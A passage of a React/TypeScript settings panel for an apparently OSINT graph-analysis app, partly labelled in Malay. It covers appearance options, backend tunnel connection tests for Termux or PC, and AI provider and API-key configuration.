                  'bypass-tunnel-reminder': 'true',
                  'Content-Type': 'application/json'
              },
              mode: 'cors'
          });
          clearTimeout(timeoutId);
          
          if (res.ok) {
              const text = await res.text();
              try {
                  const data = JSON.parse(text);
                  if (data.status === 'online') {
                      setBackendStatus('success');
                  } else {
                      setBackendStatus('fail');
                      setErrorMessage("Invalid response. Backend reached but didn't return expected health status.");
                  }
              } catch (e: any) {
                  setBackendStatus('fail');
                  setErrorMessage("TUNNEL WARNING PAGE DETECTED: Your tunnel provider (Pinggy/Localtunnel) is showing a warning page. You MUST open the tunnel URL in a new browser tab, click 'Continue/Enter' to bypass it, and ensure third-party cookies are allowed, or try a different tunnel.");
              }
          } else {
              setBackendStatus('fail');
              setErrorMessage(`Server Error: ${res.status} ${res.statusText}`);
          }
      } catch (e: any) { 
          setBackendStatus('fail'); 
          if (e.name === 'AbortError') {
              setErrorMessage('TIMEOUT: Server unreachable. Ensure backend server is running and URL is correct.');
          } else if (e.message.includes('Failed to fetch') || e.message.includes('NetworkError')) {
              setErrorMessage(config.activeBackend === 'pc' ? 'NETWORK ERROR: If you are using localhost but the app is hosted on HTTPS, your browser might block it (Mixed Content). Try using Pinggy tunnel for PC as well, or run the app locally.' : 'NETWORK ERROR: Connection refused. Solution: Open your Tunnel URL in a NEW BROWSER TAB first to bypass any "Warning Pages", then click TEST here again.');
          } else {
              setErrorMessage(e.message);
          }
      }
  };

  return (
    <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/60  p-4 animate-in zoom-in-95 duration-100">
      <div className="w-full max-w-5xl bg-[#0a0a0a]/90 border-2 border-[#ff0033] shadow-[0_0_50px_rgba(255,0,51,0.4)] font-mono flex flex-col h-[85vh]">
        
        <div className="flex justify-between items-center p-4 border-b border-[var(--theme-color)]/30 bg-[var(--theme-color)]/10">
           <div className="flex items-center gap-3">
             <div className="bg-[var(--theme-color)] text-black p-2 rounded-sm shadow-[0_0_10px_var(--theme-color)]">
                <Settings size={20} /> 
             </div>
             <div>
                <h2 className="text-lg font-black text-white uppercase tracking-widest">Control Panel</h2>
                <p className="text-[9px] text-[var(--theme-color)] font-bold tracking-[0.2em] uppercase">System Configuration</p>
             </div>
           </div>
           <button onClick={onClose} className="text-gray-400 hover:text-white hover:bg-white/10 p-2 rounded transition-all"><X size={24} /></button>
        </div>

        <div className="flex flex-1 overflow-hidden">
            <div className="w-56 border-r border-[var(--theme-color)]/20 bg-[#050505]/80 flex flex-col">
                <button onClick={() => setActiveTab('ai')} className={`p-4 text-left border-b border-white/5 flex items-center gap-3 hover:bg-white/5 transition-all ${activeTab === 'ai' ? 'text-white border-l-4 border-l-[var(--theme-color)] bg-[var(--theme-color)]/10' : 'text-gray-500'}`}>
                    <Cpu size={16} />
                    <div><div className="text-xs font-bold uppercase">AI & Search</div><div className="text-[8px]">Models & Keys</div></div>
                </button>
                <button onClick={() => setActiveTab('visual')} className={`p-4 text-left border-b border-white/5 flex items-center gap-3 hover:bg-white/5 transition-all ${activeTab === 'visual' ? 'text-white border-l-4 border-l-[var(--theme-color)] bg-[var(--theme-color)]/10' : 'text-gray-500'}`}>
                    <Eye size={16} />
                    <div><div className="text-xs font-bold uppercase">Appearance</div><div className="text-[8px]">Graph Visualization</div></div>
                </button>
                <button onClick={() => setActiveTab('backend')} className={`p-4 text-left border-b border-white/5 flex items-center gap-3 hover:bg-white/5 transition-all ${activeTab === 'backend' ? 'text-white border-l-4 border-l-[var(--theme-color)] bg-[var(--theme-color)]/10' : 'text-gray-500'}`}>
                    <Terminal size={16} />
                    <div><div className="text-xs font-bold uppercase">Backend Uplink</div><div className="text-[8px]">Termux / PC Connection</div></div>
                </button>
                <button onClick={() => setActiveTab('tutorials')} className={`p-4 text-left border-b border-white/5 flex items-center gap-3 hover:bg-white/5 transition-all ${activeTab === 'tutorials' ? 'text-white border-l-4 border-l-[var(--theme-color)] bg-[var(--theme-color)]/10' : 'text-gray-500'}`}>
                    <BookOpen size={16} />
                    <div><div className="text-xs font-bold uppercase">Help & Guides</div><div className="text-[8px]">Setup Tutorials</div></div>
                </button>
                <button onClick={() => setActiveTab('opsec')} className={`p-4 text-left border-b border-white/5 flex items-center gap-3 hover:bg-white/5 transition-all ${activeTab === 'opsec' ? 'text-rose-400 border-l-4 border-l-rose-500 bg-rose-500/10' : 'text-gray-500'}`}>
                    <ShieldAlert size={16} />
                    <div><div className="text-xs font-bold uppercase">OPSEC</div><div className="text-[8px]">Security & Purge</div></div>
                </button>
            </div>

            <div className="flex-1 overflow-y-auto p-6 custom-scrollbar bg-black/40">
                {/* Device Status Badge */}
                {(() => {
                    const dev = detectDevice();
                    return (
                        <div className="mb-6 p-2.5 bg-black/80 border border-gray-800 rounded flex items-center justify-between text-[10px] font-mono">
                            <div className="flex items-center gap-2 text-gray-300">
                                {dev.isAndroid ? <Smartphone size={14} className="text-emerald-400" /> : <Laptop size={14} className="text-blue-400" />}
                                <span><strong>PERANTI TERKESAN:</strong> {dev.summary}</span>
                            </div>
                            <span className={`text-[9px] px-2 py-0.5 rounded font-bold uppercase border ${
                                dev.isAndroid 
                                    ? 'bg-emerald-950 text-emerald-300 border-emerald-500/40' 
                                    : 'bg-blue-950 text-blue-300 border-blue-500/40'
                            }`}>
                                {dev.isAndroid ? '📱 Android / Termux' : '💻 PC / Desktop'}
                            </span>
                        </div>
                    );
                })()}
                
                {activeTab === 'visual' && (
                    <div className="space-y-8 animate-in slide-in-from-bottom-2">
                        <div className="bg-[#111] border border-gray-800 p-4 relative overflow-hidden group">
                            <h3 className="text-white font-bold text-sm uppercase flex items-center gap-2 mb-4"><ImageIcon size={16} /> Background Wallpaper</h3>
                            <div className="flex gap-4 items-center">
                                <div className="w-32 h-20 border border-gray-700 bg-black flex items-center justify-center overflow-hidden relative">
                                    {config.visual?.wallpaperUrl ? (
                                        <img src={config.visual.wallpaperUrl} className="w-full h-full object-cover opacity-60" alt="Preview" />
                                    ) : (
                                        <span className="text-[8px] text-gray-600 uppercase font-bold text-center">No Image<br/>(Default Grid)</span>
                                    )}
                                </div>
                                <div className="flex flex-col gap-2">
                                    <button onClick={() => wallpaperInputRef.current?.click()} className="px-4 py-2 bg-[var(--theme-color)] text-black text-[10px] font-bold uppercase hover:bg-white transition-all flex items-center gap-2"><Upload size={12}/> Upload Image (Max 2MB)</button>
                                    {config.visual?.wallpaperUrl && (
                                        <button onClick={clearWallpaper} className="px-4 py-2 border border-gray-700 text-gray-400 text-[10px] font-bold uppercase hover:text-red-500 hover:border-red-500 transition-all flex items-center gap-2"><Trash2 size={12}/> Reset to Default</button>
                                    )}
                                    <input type="file" ref={wallpaperInputRef} className="hidden" accept="image/png, image/jpeg, image/jpg" onChange={handleWallpaperUpload} />
                                </div>
                            </div>
                            
                            <div className="mt-6 grid grid-cols-2 gap-4">
                                <div>
                                    <div className="flex justify-between mb-1">
                                        <span className="text-[10px] text-gray-400 uppercase font-bold">Background Opacity</span>
                                        <span className="text-[10px] text-white font-mono">{Math.round((config.visual?.wallpaperOpacity ?? 0.7) * 100)}%</span>
                                    </div>
                                    <input 
                                        type="range" 
                                        min="0.1" 
                                        max="1" 
                                        step="0.05" 
                                        value={config.visual?.wallpaperOpacity ?? 0.7} 
                                        onChange={(e) => {
                                            const newConfig = {...config, visual: { ...config.visual, wallpaperOpacity: parseFloat(e.target.value) }};
                                            setConfig(newConfig);
                                            onSaveConfig("", newConfig);
                                        }} 
                                        className="w-full accent-[var(--theme-color)] bg-gray-800 h-1 rounded-lg appearance-none cursor-pointer" 
                                    />
                                </div>
                                <div>
                                    <div className="flex justify-between mb-1">
                                        <span className="text-[10px] text-gray-400 uppercase font-bold">Display Mode</span>
                                        <span className="text-[10px] text-white font-mono uppercase">{config.visual?.wallpaperMode || 'cover'}</span>
                                    </div>
                                    <div className="flex gap-2">
                                        <button 
                                            onClick={() => {
                                                const newConfig = {...config, visual: { ...config.visual, wallpaperMode: 'cover' as const }};
                                                setConfig(newConfig);
                                                onSaveConfig("", newConfig);
                                            }}
                                            className={`flex-1 py-1 text-[8px] font-bold uppercase border ${config.visual?.wallpaperMode !== 'contain' ? 'bg-[var(--theme-color)] text-black border-[var(--theme-color)]' : 'border-gray-700 text-gray-500'}`}
                                        >
                                            Cover (Full)
                                        </button>
                                        <button 
                                            onClick={() => {
                                                const newConfig = {...config, visual: { ...config.visual, wallpaperMode: 'contain' as const }};
                                                setConfig(newConfig);
                                                onSaveConfig("", newConfig);
                                            }}
                                            className={`flex-1 py-1 text-[8px] font-bold uppercase border ${config.visual?.wallpaperMode === 'contain' ? 'bg-[var(--theme-color)] text-black border-[var(--theme-color)]' : 'border-gray-700 text-gray-500'}`}
                                        >
                                            Contain (Fit)
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div>
                            <h3 className="text-white font-bold text-sm uppercase flex items-center gap-2 mb-4"><Zap size={16} className="text-emerald-400" /> Penjimatan Kuasa & Bateri (Performance)</h3>
                            <div className="bg-[#111] border border-gray-800 p-4 rounded-sm">
                                <div className="flex items-center justify-between">
                                    <div>
                                        <div className="text-xs font-bold text-white uppercase flex items-center gap-2">
                                            Henti Animasi & Kesan Blur GUI
                                            {config.visual?.lowPowerMode && <span className="text-[9px] bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 px-2 py-0.5 rounded font-mono">AKTIF</span>}
                                        </div>
                                        <p className="text-[10px] text-gray-400 mt-1 max-w-xl leading-relaxed">
                                            Menghentikan semua animasi GUI, pemprosesan <code className="text-emerald-400">backdrop-blur</code>, animasi grid, dan menyekat beban grafik. Sangat disyorkan untuk mengelakkan peranti cepat panas dan menjimatkan bateri.
                                        </p>
                                    </div>
                                    <button 
                                        onClick={() => {
                                            const newConfig = {
                                                ...config, 
                                                visual: { ...config.visual, lowPowerMode: !config.visual?.lowPowerMode }
                                            };
                                            setConfig(newConfig);
                                            onSaveConfig("", newConfig);
                                        }}
                                        className={`px-4 py-2 text-[10px] font-bold uppercase border transition-all cursor-pointer ${
                                            config.visual?.lowPowerMode 
                                                ? 'bg-emerald-600 text-black border-emerald-500 shadow-[0_0_12px_rgba(16,185,129,0.4)]' 
                                                : 'border-gray-700 text-gray-400 hover:text-white hover:border-gray-500'
                                        }`}
                                    >
                                        {config.visual?.lowPowerMode ? 'Mod Eco: AKTIF' : 'Mod Normal'}
                                    </button>
                                </div>
                            </div>
                        </div>

                        <div>
                            <h3 className="text-white font-bold text-sm uppercase flex items-center gap-2 mb-4">
                                <Monitor size={16} className="text-cyan-400" /> Virtual GPU DPI & Density Scale (Resolution Mode)
                            </h3>
                            <div className="bg-[#111] border border-gray-800 p-4 rounded-sm space-y-4">
                                <p className="text-[10px] text-gray-400 leading-relaxed">
                                    Melaraskan ketumpatan piksel Maya (<code className="text-cyan-400">Device Pixel Ratio & Scale</code>) bagi memberikan keluasan ruang kerja seolah-olah peranti berada pada resolusi 2K (1440p) atau 4K (2160p) dengan pecutan GPU hardware.
                                </p>
                                
                                <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                                    {/* 1080p */}
                                    <button
                                        type="button"
                                        onClick={() => handleGpuModeSelect('1080p')}
                                        className={`p-3 rounded border text-left transition-all cursor-pointer flex flex-col justify-between ${
                                            currentGpuMode === '1080p'
                                                ? 'bg-emerald-950/60 border-emerald-500 text-white shadow-[0_0_15px_rgba(16,185,129,0.3)]'
                                                : 'bg-black/50 border-gray-800 text-gray-400 hover:border-gray-600 hover:text-gray-200'
                                        }`}
                                    >
                                        <div>
                                            <div className="flex items-center justify-between mb-1">
                                                <span className="font-bold text-xs text-emerald-400">1080p Standard</span>
                                                <span className="text-[9px] px-1.5 py-0.5 rounded bg-emerald-950 text-emerald-300 border border-emerald-500/40 font-mono">1.0x</span>
                                            </div>
                                            <p className="text-[9px] text-gray-400 leading-tight">
                                                Skala asas 100%. Mesra peranti skrin sentuh & telefon pintar.
                                            </p>
                                        </div>
                                        <div className="mt-3 text-[8px] font-mono text-emerald-400/80">📱 Mobile & Standard</div>
                                    </button>

                                    {/* 2K */}
                                    <button
                                        type="button"
                                        onClick={() => handleGpuModeSelect('2k')}
                                        className={`p-3 rounded border text-left transition-all cursor-pointer flex flex-col justify-between ${
                                            currentGpuMode === '2k'
                                                ? 'bg-cyan-950/60 border-cyan-500 text-white shadow-[0_0_15px_rgba(6,182,212,0.3)]'
                                                : 'bg-black/50 border-gray-800 text-gray-400 hover:border-gray-600 hover:text-gray-200'
                                        }`}
                                    >
                                        <div>
                                            <div className="flex items-center justify-between mb-1">
                                                <span className="font-bold text-xs text-cyan-300">2K High-DPI</span>
                                                <span className="text-[9px] px-1.5 py-0.5 rounded bg-cyan-950 text-cyan-300 border border-cyan-500/40 font-mono">0.85x (+18%)</span>
                                            </div>
                                            <p className="text-[9px] text-gray-400 leading-tight">
                                                Ketajaman dipertingkatkan. Ruang graf 18% lebih luas.
                                            </p>
                                        </div>
                                        <div className="mt-3 text-[8px] font-mono text-cyan-300/80">💻 Laptop & HD Monitor</div>
                                    </button>

                                    {/* 4K */}
                                    <button
                                        type="button"
                                        onClick={() => handleGpuModeSelect('4k')}
                                        className={`p-3 rounded border text-left transition-all cursor-pointer flex flex-col justify-between ${
                                            currentGpuMode === '4k'
                                                ? 'bg-purple-950/60 border-purple-500 text-white shadow-[0_0_15px_rgba(168,85,247,0.3)]'
                                                : 'bg-black/50 border-gray-800 text-gray-400 hover:border-gray-600 hover:text-gray-200'
                                        }`}
                                    >
                                        <div>
                                            <div className="flex items-center justify-between mb-1">
                                                <span className="font-bold text-xs text-purple-300">4K Ultra-Density</span>
                                                <span className="text-[9px] px-1.5 py-0.5 rounded bg-purple-950 text-purple-300 border border-purple-500/40 font-mono">0.72x (+95%)</span>
                                            </div>
                                            <p className="text-[9px] text-gray-400 leading-tight">
                                                Pandangan padat 4K. Kepadatan nod & maklumat maksimum.
                                            </p>
                                        </div>
                                        <div className="mt-3 text-[8px] font-mono text-purple-300/80">🖥️ 2K/4K Display & Rig</div>
                                    </button>
                                </div>

                                {/* Pro & Con Collapse Note */}
                                <div className="mt-3 p-3 bg-black/60 border border-white/10 rounded text-[10px] space-y-1.5">
                                    <div className="font-bold text-gray-300 flex items-center gap-1.5">
                                        <Info size={13} className="text-cyan-400 shrink-0" />
                                        <span>Analisis Ringkas Pro & Kontra UX:</span>
                                    </div>
                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-2 text-[9px] text-gray-400">
                                        <div className="text-emerald-300/90">
                                            ✔ <strong>Pro:</strong> Ruang analisis +95% lebih luas, teks & garisan graf tajam tanpa pecah, pergerakan kanvas 60-120 FPS dengan GPU hardware acceleration.
                                        </div>
                                        <div className="text-amber-300/90">
                                            ⚠ <strong>Kontra:</strong> Butang sentuhan menjadi lebih kecil pada skrin telefon dan boleh meningkatkan penggunaan bateri peranti jika dipaksa pada 4K.
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div>
                            <h3 className="text-white font-bold text-sm uppercase flex items-center gap-2 mb-4"><Palette size={16} /> Interface Theme</h3>
                            <div className="flex gap-4">
                                {['#ff0033', '#00ccff', '#10b981', '#f59e0b', '#8b5cf6'].map(color => (
                                    <button 
                                        key={color} 
                                        onClick={() => {
                                            const newConfig = {...config, visual: { ...config.visual, themeColor: color as any }};
                                            setConfig(newConfig);
                                            onSaveConfig("", newConfig);
                                        }} 
                                        className={`w-12 h-12 rounded border-2 transition-all shadow-[0_0_15px_rgba(0,0,0,0.5)] ${config.visual?.themeColor === color ? 'border-white scale-110' : 'border-gray-800 opacity-60'}`} 
                                        style={{ backgroundColor: color }} 
                                    />
                                ))}
                            </div>
                        </div>

                        <div>
                            <h3 className="text-white font-bold text-sm uppercase flex items-center gap-2 mb-2"><Sliders size={16} className="text-cyan-400" /> Enjin Paparan Graf (Canvas vs SVG)</h3>
                            <p className="text-[10px] text-gray-400 mb-3 leading-relaxed">
                                Pilih enjin rendering kanvas. <strong>Canvas 2D Turbo</strong> melukis keseluruhan rangkaian terus ke kad grafik (GPU) tanpa bebanan DOM, menghapuskan lag pada 50–1,000+ nod seperti mana IBM i2 & Maltego.
                            </p>
                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-6">
                                <button 
                                    onClick={() => {
                                        const newConfig: ModelConfig = {
                                            ...config, 
                                            visual: { 
                                                themeColor: '#ff0033',
                                                nodeSize: 22,
                                                linkDistance: 140,
                                                showParticles: true,
                                                gridOpacity: 0.1,
                                                ...config.visual, 
                                                graphRenderer: 'canvas' as const 
                                            }
                                        };
                                        setConfig(newConfig);
                                        onSaveConfig("", newConfig);
                                    }} 
                                    className={`p-3 text-left border rounded transition-all cursor-pointer flex flex-col justify-between ${config.visual?.graphRenderer !== 'svg' ? 'bg-cyan-950/60 border-cyan-500 text-white shadow-[0_0_15px_rgba(6,182,212,0.3)]' : 'bg-black/50 border-gray-800 text-gray-400 hover:border-gray-600 hover:text-gray-200'}`}
                                >
                                    <div>
                                        <div className="flex items-center justify-between mb-1">
                                            <span className="font-bold text-xs text-cyan-300">⚡ Canvas 2D Turbo</span>
                                            <span className="text-[8px] px-1.5 py-0.5 rounded bg-cyan-950 text-cyan-300 border border-cyan-500/40 font-mono">60 FPS</span>
                                        </div>
                                        <p className="text-[9px] text-gray-400 leading-tight">
                                            Enjin pecutan perkakasan. Bebas lag untuk 50–1,000+ nod dengan Viewport Culling & LOD automatik (Standard Maltego/i2).
                                        </p>
                                    </div>
                                    <div className="mt-2 text-[8px] font-mono text-cyan-400">Paling Disyorkan (Lalai)</div>
                                </button>
                                <button 
                                    onClick={() => {
                                        const newConfig: ModelConfig = {
                                            ...config, 
                                            visual: { 
                                                themeColor: '#ff0033',
                                                nodeSize: 22,
                                                linkDistance: 140,
                                                showParticles: true,
                                                gridOpacity: 0.1,
                                                ...config.visual, 
                                                graphRenderer: 'svg' as const 
                                            }
                                        };
                                        setConfig(newConfig);
                                        onSaveConfig("", newConfig);
                                    }} 
                                    className={`p-3 text-left border rounded transition-all cursor-pointer flex flex-col justify-between ${config.visual?.graphRenderer === 'svg' ? 'bg-[var(--theme-color)]/20 border-[var(--theme-color)] text-white shadow-[0_0_15px_rgba(255,0,51,0.2)]' : 'bg-black/50 border-gray-800 text-gray-400 hover:border-gray-600 hover:text-gray-200'}`}
                                >
                                    <div>
                                        <div className="flex items-center justify-between mb-1">
                                            <span className="font-bold text-xs text-gray-300">SVG DOM (Legasi)</span>
                                            <span className="text-[8px] px-1.5 py-0.5 rounded bg-zinc-900 text-zinc-400 border border-zinc-700 font-mono">DOM Tree</span>
                                        </div>
                                        <p className="text-[9px] text-gray-400 leading-tight">
                                            Melukis elemen SVG DOM individu. Sesuai untuk graf kecil sahaja (&lt; 35 nod). Boleh lag teruk pada graf padat.
                                        </p>
                                    </div>
                                    <div className="mt-2 text-[8px] font-mono text-gray-500">Sesuai Graf Kecil Sahaja</div>
                                </button>
                            </div>
                            <h3 className="text-white font-bold text-sm uppercase flex items-center gap-2 mb-4"><Sliders size={16} /> Graph Physics</h3>
                            <div className="space-y-6">
                                <div>
                                    <div className="flex justify-between mb-1">
                                        <span className="text-[10px] text-gray-400 uppercase font-bold">Node Size</span>
                                        <span className="text-[10px] text-white font-mono">{config.visual?.nodeSize || 22}px</span>
                                    </div>
                                    <input type="range" min="10" max="50" value={config.visual?.nodeSize || 22} onChange={(e) => setConfig({...config, visual: { ...config.visual, nodeSize: parseInt(e.target.value) }})} className="w-full accent-[var(--theme-color)] bg-gray-800 h-1 rounded-lg appearance-none cursor-pointer" />
                                </div>
                                <div>
                                    <div className="flex justify-between mb-1">
                                        <span className="text-[10px] text-gray-400 uppercase font-bold">Link Distance</span>
                                        <span className="text-[10px] text-white font-mono">{config.visual?.linkDistance || 140}px</span>
                                    </div>
                                    <input type="range" min="50" max="400" value={config.visual?.linkDistance || 140} onChange={(e) => setConfig({...config, visual: { ...config.visual, linkDistance: parseInt(e.target.value) }})} className="w-full accent-[var(--theme-color)] bg-gray-800 h-1 rounded-lg appearance-none cursor-pointer" />
                                </div>
                            </div>
                        </div>
                    </div>
                )}

                {activeTab === 'backend' && (
                    <div className="space-y-6 animate-in slide-in-from-bottom-2">
                        <div className="flex gap-4 border-b border-gray-800 pb-4">
                            <label className="flex items-center gap-2 cursor-pointer">
                                <input type="radio" checked={config.activeBackend === 'termux'} onChange={() => setConfig({...config, activeBackend: 'termux'})} className="accent-[#ff0033]" />
                                <span className={`text-xs font-bold uppercase ${config.activeBackend === 'termux' ? 'text-white' : 'text-gray-500'}`}>Android (Termux)</span>
                            </label>
                            <label className="flex items-center gap-2 cursor-pointer">
                                <input type="radio" checked={config.activeBackend === 'pc'} onChange={() => setConfig({...config, activeBackend: 'pc'})} className="accent-[#00ccff]" />
                                <span className={`text-xs font-bold uppercase ${config.activeBackend === 'pc' ? 'text-white' : 'text-gray-500'}`}>PC (Linux/WSL)</span>
                            </label>
                        </div>

                        {config.activeBackend === 'termux' ? (
                            <div className="space-y-4">
                                <div className="bg-[#ff0033]/10 border border-[#ff0033] p-3 flex items-start gap-3 rounded-sm">
                                    <ShieldAlert className="text-[#ff0033] shrink-0 mt-0.5" size={16} />
                                    <div>
                                        <h3 className="text-white font-bold uppercase text-xs">Termux Backend Uplink</h3>
                                        <p className="text-[10px] text-gray-300 mt-1 leading-relaxed">Enables native tools: Sherlock, Nmap, Python scripts. Requires Termux on Android.</p>
                                    </div>
                                </div>
                                <div>
                                    <label className="text-[10px] font-bold text-gray-500 uppercase flex items-center gap-2 mb-2"><Globe size={12} /> Termux Server URL (Tunnels)</label>
                                    <div className="flex gap-2">
                                        <input type="text" value={config.customBackendUrl || ''} onChange={(e) => setConfig({...config, customBackendUrl: e.target.value})} placeholder="https://your-tunnel-url.lhr.life" className="flex-1 bg-black border border-gray-700 text-white text-sm py-2 px-3 outline-none focus:border-[#ff0033] font-mono" />
                                        <button onClick={testBackend} className={`px-4 text-xs font-bold uppercase transition-all flex items-center gap-2 border ${backendStatus === 'success' ? 'bg-green-600 border-green-600 text-black' : backendStatus === 'fail' ? 'bg-red-600 border-red-600 text-black' : 'border-gray-600 text-gray-400 hover:text-white'}`}>
                                            {backendStatus === 'testing' ? <RefreshCw className="animate-spin" size={14} /> : (backendStatus === 'success' ? 'ONLINE' : 'TEST')}
                                        </button>
                                    </div>
                                    {backendStatus === 'fail' && (
                                        <div className="mt-3 p-3 bg-red-900/10 border border-red-800 text-red-400 text-[10px] font-mono leading-relaxed">
                                            <strong className="block mb-1 text-red-500 uppercase text-xs">CONNECTION FAILED</strong>
                                            {errorMessage}
                                        </div>
                                    )}
                                </div>
                            </div>
                        ) : (
                            <div className="space-y-4">
                                <div className="bg-[#00ccff]/10 border border-[#00ccff] p-3 flex items-start gap-3 rounded-sm">
                                    <Server className="text-[#00ccff] shrink-0 mt-0.5" size={16} />
                                    <div>
                                        <h3 className="text-white font-bold uppercase text-xs">PC Backend Uplink</h3>
                                        <p className="text-[10px] text-gray-300 mt-1 leading-relaxed">Connect to backend running locally on your PC (e.g. http://localhost:3000).</p>
                                    </div>
                                </div>
                                <div>
                                    <label className="text-[10px] font-bold text-gray-500 uppercase flex items-center gap-2 mb-2"><Globe size={12} /> PC Server URL</label>
                                    <div className="flex gap-2">
                                        <input type="text" value={config.pcBackendUrl || ''} onChange={(e) => setConfig({...config, pcBackendUrl: e.target.value})} placeholder="http://localhost:3000" className="flex-1 bg-black border border-gray-700 text-white text-sm py-2 px-3 outline-none focus:border-[#00ccff] font-mono" />
                                        <button onClick={testBackend} className={`px-4 text-xs font-bold uppercase transition-all flex items-center gap-2 border ${backendStatus === 'success' ? 'bg-green-600 border-green-600 text-black' : backendStatus === 'fail' ? 'bg-red-600 border-red-600 text-black' : 'border-gray-600 text-gray-400 hover:text-white'}`}>
                                            {backendStatus === 'testing' ? <RefreshCw className="animate-spin" size={14} /> : (backendStatus === 'success' ? 'ONLINE' : 'TEST')}
                                        </button>
                                    </div>
                                    {backendStatus === 'fail' && (
                                        <div className="mt-3 p-3 bg-red-900/10 border border-red-800 text-red-400 text-[10px] font-mono leading-relaxed">
                                            <strong className="block mb-1 text-red-500 uppercase text-xs">CONNECTION FAILED</strong>
                                            {errorMessage}
                                        </div>
                                    )}
                                </div>
                            </div>
                        )}

                        <div className="border-t border-gray-800 pt-4">
                            <div className="flex justify-between items-center mb-2">
                                <h3 className="text-white font-bold text-xs uppercase flex items-center gap-2"><Terminal size={12}/> Updated Server Code</h3>
                                {copyStatus && <span className="text-[10px] text-green-500 font-bold">{copyStatus}</span>}
                            </div>
                            <div className="relative group">
                                <textarea readOnly value={TERMUX_SERVER_CODE} className="w-full h-32 bg-black text-gray-500 text-[10px] font-mono p-3 border border-gray-900 outline-none resize-none" />
                                <button onClick={() => copyToClipboard(TERMUX_SERVER_CODE)} className="absolute top-2 right-2 bg-gray-800 hover:bg-[#ff0033] hover:text-black text-white px-2 py-1 text-[9px] font-bold uppercase transition-all flex items-center gap-1">
                                    <Copy size={10}/> Copy
                                </button>
                            </div>
                        </div>
                    </div>
                )}

                {activeTab === 'ai' && (
                    <div className="space-y-6 animate-in slide-in-from-bottom-2">
                        <div className="bg-black border border-gray-800 p-4">
                            <label className="text-[10px] text-gray-500 uppercase font-bold mb-2 block">AI Provider</label>
                            <select value={config.provider} onChange={(e) => setConfig({...config, provider: e.target.value as AIProvider})} className="w-full bg-[#111] border border-gray-700 text-white text-sm py-2 px-3 mb-4 focus:border-[#ff0033] outline-none">
                                <option value="google">Google Gemini (Default / Server-Side)</option>
                                <option value="openrouter">OpenRouter - NVIDIA Nemotron (AI OSINT Engine)</option>
                                <option value="deepseek">DeepSeek</option>
                                <option value="custom">Local LLM (Ollama / LMStudio)</option>
                            </select>

                            {config.provider === 'openrouter' && (
                                 <div className="space-y-4">
                                    <div className="bg-[#10b981]/10 border border-[#10b981]/40 p-3 rounded-sm">
                                        <div className="flex items-center gap-2 text-emerald-400 font-bold text-xs uppercase mb-1">
                                            <Cpu size={14} /> NVIDIA Nemotron & OpenRouter AI Engine
                                        </div>
                                        <p className="text-[10px] text-gray-300 leading-relaxed">
                                            Sistem ini menyokong <strong>NVIDIA Direct API Key (nvapi-...)</strong> terus dari <em>build.nvidia.com</em> dan <strong>OpenRouter API Key (sk-or-v1-...)</strong> untuk model Nemotron Deep Reasoning, pengekstrakan entiti OSINT, dan analisis rantaian korelasi risikan.
                                        </p>
                                    </div>

                                    <div>
                                        <div className="flex items-center justify-between mb-1">
                                            <label className="text-[10px] text-gray-500 uppercase font-bold block">
                                                API Key (OpenRouter atau NVIDIA Direct)
                                            </label>
                                            <div className="flex items-center gap-2">
                                                <a href="https://build.nvidia.com" target="_blank" rel="noreferrer" className="text-emerald-400 hover:underline text-[9px] flex items-center gap-0.5">
                                                    NVIDIA NIM <ExternalLink size={9} />
                                                </a>
                                                <span className="text-gray-600 text-[9px]">|</span>
                                                <a href="https://openrouter.ai/keys" target="_blank" rel="noreferrer" className="text-emerald-400 hover:underline text-[9px] flex items-center gap-0.5">
                                                    OpenRouter <ExternalLink size={9} />
                                                </a>
                                            </div>
                                        </div>
                                        <div className="flex gap-2">
                                            <div className="relative flex-1 flex items-center">
                                                <input 
                                                    type={showOpenRouterKey ? "text" : "password"} 
                                                    value={config.openrouterApiKey || ''} 
                                                    onChange={(e) => setConfig({
                                                        ...config, 
                                                        openrouterApiKey: e.target.value
                                                    })} 
                                                    placeholder="nvapi-... ATAU sk-or-v1-..." 
                                                    className="w-full bg-[#111] border border-gray-700 text-white text-xs py-2 pl-3 pr-10 focus:border-emerald-500 outline-none font-mono" 
                                                />
                                                <button
                                                    type="button"
                                                    onClick={() => setShowOpenRouterKey(!showOpenRouterKey)}
                                                    className="absolute right-2 text-gray-400 hover:text-white p-1"
                                                    title={showOpenRouterKey ? "Sembunyikan Kunci" : "Pamerkan Kunci (Mengintai)"}
                                                >
                                                    {showOpenRouterKey ? <EyeOff className="w-4 h-4 text-emerald-400" /> : <Eye className="w-4 h-4" />}
                                                </button>
                                            </div>
                                            <button 
                                                type="button" 
                                                onClick={testOpenRouter} 
                                                className={`px-4 text-xs font-bold uppercase transition-all flex items-center gap-1.5 border ${
                                                    openRouterStatus === 'success' 
                                                        ? 'bg-emerald-600 border-emerald-600 text-black' 
                                                        : openRouterStatus === 'fail' 
                                                            ? 'bg-red-600 border-red-600 text-black' 
                                                            : 'border-gray-700 text-gray-300 hover:text-white hover:border-emerald-500'
                                                }`}
                                            >
                                                {openRouterStatus === 'testing' ? <RefreshCw className="animate-spin" size={12} /> : (openRouterStatus === 'success' ? 'ONLINE' : 'TEST')}
                                            </button>
                                        </div>

                                        {/* Key Type Detection Indicator */}
                                        {config.openrouterApiKey && config.openrouterApiKey.trim().length > 5 && (
                                            <div className="mt-1.5 flex items-center gap-1.5 text-[9px] font-mono">
                                                {config.openrouterApiKey.trim().startsWith('nvapi-') ? (
                                                    <span className="text-emerald-400 bg-emerald-950/60 border border-emerald-800/60 px-2 py-0.5 rounded">
                                                        🟢 Kunci NVIDIA NIM Direct dikesan (Endpoint: integrate.api.nvidia.com)
                                                    </span>
                                                ) : config.openrouterApiKey.trim().startsWith('sk-or-') ? (
                                                    <span className="text-cyan-400 bg-cyan-950/60 border border-cyan-800/60 px-2 py-0.5 rounded">
                                                        🔵 Kunci OpenRouter dikesan (Endpoint: openrouter.ai)
                                                    </span>
                                                ) : (
                                                    <span className="text-yellow-400 bg-yellow-950/60 border border-yellow-800/60 px-2 py-0.5 rounded">
                                                        🟡 Format Kunci Kustom / Universal AI Key
                                                    </span>
                                                )}
                                            </div>
                                        )}

                                        {openRouterMsg && (
